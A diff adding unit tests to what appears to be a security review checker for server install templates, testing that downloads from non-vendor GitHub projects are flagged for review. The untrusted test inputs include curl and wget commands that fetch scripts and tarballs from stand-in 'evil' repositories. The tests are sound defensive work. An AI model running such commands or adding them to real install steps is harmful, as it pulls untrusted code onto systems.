@@ -89,6 +89,33 @@ class ReviewRules(unittest.TestCase):
         self.assertIn("path-outside", {r for r, _ in got})
         self.assertNotIn(("docker-setting", "Init"), got)
 
+    def test_only_the_vendors_github_projects_are_trusted(self):
+        trusted = [
+            "curl -L -o Lavalink.jar https://github.com/lavalink-devs/Lavalink/releases/download/4.0.0/Lavalink.jar",
+            "curl -o i.sh https://raw.githubusercontent.com/pmmp/get.pmmp.io/stable/installer.sh",
+            "wget https://github.com/citizenfx/cfx-server-data/archive/refs/heads/master.zip",
+            "git clone ${GIT_REPO} .", "curl -L https://github.com/${OWNER}/${REPO}/archive/main.zip",
+        ]
+        for cmd in trusted:
+            with self.subTest(cmd=cmd):
+                self.assertEqual(rules(template([cmd])), set())
+        untrusted = {
+            "curl -L -o x https://github.com/someone/tool/releases/download/1.0/tool": "someone/tool",
+            "wget https://raw.githubusercontent.com/evil/scripts/main/run.sh": "evil/scripts",
+            "curl https://api.github.com/repos/evil/x/tarball": "evil/x",
+            "wget https://objects.githubusercontent.com/abc/def": "objects.githubusercontent.com",
+        }
+        for cmd, detail in untrusted.items():
+            with self.subTest(cmd=cmd):
+                got = {(f.rule, f.detail, f.level) for f in findings(template([cmd]))}
+                self.assertIn(("github-project", detail, "review"), got)
+
+    def test_a_githubdl_step_names_its_project(self):
+        ok = template(steps=[{"type": "githubdl", "repository": "lavalink-devs/Lavalink", "assetMatch": "Lavalink.jar"}])
+        self.assertEqual(rules(ok), set())
+        other = template(steps=[{"type": "githubdl", "repository": "someone/server", "assetMatch": "x.jar"}])
+        self.assertEqual({(f.rule, f.detail) for f in findings(other)}, {("github-project", "someone/server")})
+
     def test_the_allow_list_accepts_a_review_by_its_detail(self):
         cmd = "curl -o x https://files.unknown-host.example/x"
         with mock.patch.object(sc, "load_allow", return_value={("t", "untrusted-host", "files.unknown-host.example")}):
